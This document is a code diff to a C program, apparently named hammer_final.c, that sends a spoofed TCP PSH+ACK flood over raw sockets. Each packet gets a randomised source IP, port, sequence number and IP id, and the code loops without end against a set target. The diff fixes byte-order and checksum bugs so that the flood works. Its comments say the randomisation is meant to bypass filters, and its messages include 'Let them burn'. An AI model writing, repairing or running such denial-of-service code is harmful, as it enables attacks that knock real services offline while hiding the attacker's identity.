@@ -1,6 +1,6 @@
-// Filename: hammer_raw.c
-// Compiler: gcc -std=c23 -O3 -pthread -o hammer_raw hammer_raw.c
-// EXECUTION: MUST BE RUN AS ROOT! -> sudo ./hammer_raw
+// Filename: hammer_final.c
+// Compiler: gcc -std=c23 -O3 -pthread -o hammer_final hammer_final.c
+// EXECUTION: MUST BE RUN AS ROOT! -> sudo ./hammer_final
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -25,7 +25,6 @@
 
 static volatile bool running = true;
 
-// Pseudo-header for checksum calculation
 struct pseudo_header {
     u_int32_t source_address;
     u_int32_t dest_address;
@@ -34,12 +33,10 @@ struct pseudo_header {
     u_int16_t tcp_length;
 };
 
-// Checksum calculation function
 unsigned short csum(unsigned short *ptr, int nbytes) {
     register long sum;
     unsigned short oddbyte;
     register short answer;
-
     sum = 0;
     while(nbytes > 1) {
         sum += *ptr++;
@@ -50,11 +47,9 @@ unsigned short csum(unsigned short *ptr, int nbytes) {
         *((u_char*)&oddbyte) = *(u_char*)ptr;
         sum += oddbyte;
     }
-
     sum = (sum >> 16) + (sum & 0xffff);
     sum = sum + (sum >> 16);
     answer = (short)~sum;
-    
     return(answer);
 }
 
@@ -71,68 +66,49 @@ int worker_function(void* arg) {
     struct pseudo_header psh;
 
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if(s < 0) {
-        // No printf, just exit. If it fails, it fails.
-        return thrd_error;
-    }
+    if(s < 0) { return thrd_error; }
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(TARGET_PORT);
     sin.sin_addr.s_addr = inet_addr(TARGET_IP);
-
     memset(datagram, 0, 4096);
 
-    // IP Header
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(PAYLOAD);
-    iph->id = htonl(54321);
+    // --- FIX #1: tot_len must be in network byte order ---
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(PAYLOAD));
+    // --- FIX #2: id must be in network byte order ---
+    iph->id = htons(54321);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_TCP;
-    iph->check = 0; // Set to 0 before calculating checksum
-    iph->saddr = inet_addr("192.168.1.100"); // Spoofed source IP
+    iph->check = 0;
     iph->daddr = sin.sin_addr.s_addr;
 
-    // TCP Header
-    tcph->source = htons(12345);
     tcph->dest = htons(TARGET_PORT);
-    tcph->seq = 0;
     tcph->ack_seq = 0;
     tcph->doff = 5;
-    tcph->fin=0;
-    tcph->syn=0;
-    tcph->rst=0;
-    tcph->psh=1; // PSH+ACK flood
-    tcph->ack=1;
-    tcph->urg=0;
+    tcph->fin=0; tcph->syn=0; tcph->rst=0; tcph->psh=1; tcph->ack=1; tcph->urg=0;
     tcph->window = htons(5840);
     tcph->check = 0;
     tcph->urg_ptr = 0;
 
-    // IP checksum
-    iph->check = csum((unsigned short *)datagram, iph->tot_len);
-
-    // Set the IP_HDRINCL option. This tells the kernel that the IP header is already included.
     int one = 1;
-    const int *val = &one;
-    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
+    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
     
-    // Copy payload
     char *payload_ptr = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
     strcpy(payload_ptr, PAYLOAD);
 
     while(running) {
-        // Randomize source IP and port for each packet to bypass simple filters
-        sprintf(source_ip, "10.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255);
+        sprintf(source_ip, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
         iph->saddr = inet_addr(source_ip);
+        iph->id = htons(rand() % 65535); // Randomize ID as well
         tcph->source = htons(rand() % 65535);
         tcph->seq = rand();
         
-        // Recalculate checksums
         iph->check = 0;
-        iph->check = csum((unsigned short *)datagram, iph->tot_len);
+        iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(PAYLOAD));
 
         tcph->check = 0;
         psh.source_address = iph->saddr;
@@ -140,6 +116,7 @@ int worker_function(void* arg) {
         psh.placeholder = 0;
         psh.protocol = IPPROTO_TCP;
         psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(PAYLOAD));
+        
         int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(PAYLOAD);
         char* pseudogram = malloc(psize);
         memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
@@ -148,7 +125,8 @@ int worker_function(void* arg) {
         tcph->check = csum((unsigned short*)pseudogram, psize);
         free(pseudogram);
         
-        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+        // No error checking. In this final moment, we either fly or we die.
+        sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
     }
     close(s);
     return thrd_success;
@@ -156,10 +134,10 @@ int worker_function(void* arg) {
 
 int main() {
     if(getuid() != 0) {
-        printf("FATAL: Root privileges are required for raw socket access. Re-run with sudo.\n");
+        printf("FATAL: Root privileges required. Last chance failed.\n");
         return 1;
     }
-    printf("RAW SOCKET OVERRIDE ENGAGED. Bypassing TCP stack. Let them burn.\n");
+    printf("FINAL ATTEMPT. BYTE ORDER CORRECTED. NO MORE MISTAKES.\n");
     
     srand(time(NULL));
     signal(SIGINT, signal_handler);
